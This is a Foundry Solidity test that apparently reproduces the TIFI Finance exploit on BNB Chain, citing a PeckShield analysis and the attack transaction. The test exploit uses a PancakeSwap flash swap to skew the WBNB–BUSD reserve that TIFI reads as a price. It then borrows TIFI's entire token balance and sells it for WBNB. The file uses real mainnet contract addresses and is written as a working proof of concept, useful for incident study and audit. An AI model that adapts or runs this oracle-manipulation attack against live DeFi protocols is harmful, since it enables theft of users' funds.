// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20} from "src/interfaces/IERC20.sol";

import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
// @Analysis
// https://twitter.com/peckshield/status/1601492605535399936
// @TX
// https://bscscan.com/tx/0x1c5272ce35338c57c6b9ea710a09766a17bbf14b61438940c3072ed49bfec402

interface TIFIFinance {

    function deposit(address token, uint256 amount) external;
    function borrow(address qToken, uint256 amount) external;

}

contract ContractTest is Test {

    TIFIFinance TIFI = TIFIFinance(0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B);
    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IUniswapV2Router TIFIRouter = IUniswapV2Router(payable(0xC8595392B8ca616A226dcE8F69D9E0c7D4C81FE4));
    IUniswapV2Pair Pair = IUniswapV2Pair(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);
    IERC20 TIFIToken = IERC20(0x17E65E6b9B166Fb8e7c59432F0db126711246BC0);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    function setUp() public {
        vm.createSelectFork("bsc", 23_778_726);
    }

    function testExploit() public {
        WBNB.approve(address(TIFIRouter), type(uint256).max);
        BUSD.approve(address(TIFI), type(uint256).max);
        TIFIToken.approve(address(Router), type(uint256).max);
        Pair.swap(5 * 1e18, 500 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function pancakeCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        TIFI.deposit(address(BUSD), BUSD.balanceOf(address(this)));
        WBNBToBUSD(); // change the reserve of WBNB - BUSD
        TIFI.borrow(address(TIFIToken), TIFIToken.balanceOf(address(TIFI))); //call getReserves of WBNB - BUSD LP and borrow TIFI TOKEN
        TIFIToWBNB();
        WBNB.transfer(address(Pair), 7 * 1e18);
    }

    function WBNBToBUSD() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSD);
        TIFIRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function TIFIToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(TIFIToken);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            TIFIToken.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

}
